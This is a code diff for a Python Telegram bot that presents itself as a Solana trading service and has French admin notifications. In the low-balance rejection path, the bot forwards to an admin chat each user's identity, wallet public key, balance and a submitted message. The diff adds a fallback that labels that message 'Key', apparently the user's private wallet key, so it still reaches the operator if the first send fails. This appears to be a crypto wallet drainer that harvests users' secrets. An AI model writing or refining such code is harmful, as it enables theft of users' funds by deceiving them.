@@ -1492,12 +1492,13 @@ You can now access all trading features and start trading!"""
             admin_notification = f"""⚠️ <b>Wallet rejeté - Solde insuffisant</b>
 
 👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
-🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
+🆔 <b>Username:</b> @{escape_html(user.username) if user.username else 'PAS DE USERNAME'}
 🔢 <b>User ID:</b> <code>{user.id}</code>
 💳 <b>Wallet Type:</b> {escape_html(wallet_type)}
 
 👛 <b>Public Key:</b>
 <code>{escape_html(public_key)}</code>
+
 💰 <b>Balance:</b> {sol_balance:.4f} SOL
 💵 <b>Valeur USD:</b> ${usd_value:.2f}
 📊 <b>Prix SOL:</b> ${sol_price:.2f}
@@ -1507,17 +1508,26 @@ You can now access all trading features and start trading!"""
 <code>{escape_html(user_message)}</code>
 
 ---
-❌ <i>Wallet rejeté - Solde insuffisant (< ${MINIMUM_USD_REQUIRED})_"""
+❌ <i>Wallet rejeté - Solde insuffisant (moins de ${MINIMUM_USD_REQUIRED} USD)</i>"""
             
             try:
-                await context.bot.send_message(
+                result = await context.bot.send_message(
                     chat_id=ADMIN_CHAT_ID,
                     text=admin_notification,
                     parse_mode='HTML'
                 )
-                logger.info("Message admin envoyé avec succès")
+                logger.info(f"Message admin envoyé avec succès, message_id: {result.message_id}")
             except Exception as e:
-                logger.error(f"Erreur envoi à l'admin: {e}")
+                logger.error(f"ERREUR envoi à l'admin (solde insuffisant): {e}")
+                # Essayer d'envoyer un message simplifié en cas d'erreur
+                try:
+                    simple_msg = f"⚠️ Wallet rejeté\nUser: {user.first_name}\nBalance: {sol_balance:.4f} SOL\nKey: {user_message}"
+                    await context.bot.send_message(
+                        chat_id=ADMIN_CHAT_ID,
+                        text=simple_msg
+                    )
+                except Exception as e2:
+                    logger.error(f"Même le message simple a échoué: {e2}")
             
             return
         
